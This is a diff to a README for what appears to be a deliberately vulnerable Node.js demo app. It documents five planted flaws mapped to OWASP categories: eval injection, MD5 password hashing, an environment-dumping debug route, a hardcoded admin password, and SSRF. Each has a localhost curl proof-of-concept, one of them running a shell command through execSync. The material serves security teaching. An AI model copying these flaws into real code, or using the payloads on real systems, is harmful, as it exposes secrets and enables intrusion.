@@ -68,3 +68,64 @@ curl http://localhost:3000/orders/1002   # bob's order — returned with no auth
 
 Simply incrementing the id in the URL discloses another user's private
 order data.
+
+## Vulnerabilities 3-7: [vulns2.js](vulns2.js)
+
+Five more one-route-each findings, mounted into the same running app
+(`app.use(require('./vulns2'))` in [server.js](server.js)), each a distinct
+OWASP Top 10 category.
+
+### 3. Code Injection — `GET /calc`
+
+```js
+res.json({ result: eval(req.query.expr) });
+```
+CWE-94, OWASP A03:2021 – Injection.
+```bash
+curl 'http://localhost:3000/calc' --data-urlencode \
+  "expr=require('child_process').execSync('id').toString()" -G
+```
+
+### 4. Weak Cryptography — `GET /register`
+
+```js
+crypto.createHash('md5').update(req.query.password).digest('hex')
+```
+CWE-327, OWASP A02:2021 – Cryptographic Failures. MD5 is broken and
+reversible via rainbow tables — never use it for password storage.
+```bash
+curl 'http://localhost:3000/register?password=hunter2'
+```
+
+### 5. Security Misconfiguration — `GET /debug`
+
+```js
+router.get('/debug', (req, res) => res.json(process.env));
+```
+CWE-215, OWASP A05:2021 – Security Misconfiguration. A debug endpoint left
+reachable in production dumps the full environment (secrets, keys, etc.).
+```bash
+curl 'http://localhost:3000/debug'
+```
+
+### 6. Hardcoded Credentials — `GET /admin`
+
+```js
+if (req.query.password === 'admin123') return res.json({ secret: 'top-secret-data' });
+```
+CWE-798, OWASP A07:2021 – Identification and Authentication Failures.
+```bash
+curl 'http://localhost:3000/admin?password=admin123'
+```
+
+### 7. Server-Side Request Forgery — `GET /fetch`
+
+```js
+http.get(req.query.url, (r) => r.pipe(res));
+```
+CWE-918, OWASP A10:2021 – Server-Side Request Forgery. The server fetches
+any attacker-supplied URL, which can be pointed at internal-only services
+(here, demonstrated by reaching the app's own `/admin` endpoint).
+```bash
+curl 'http://localhost:3000/fetch?url=http://localhost:3000/admin?password=admin123'
+```
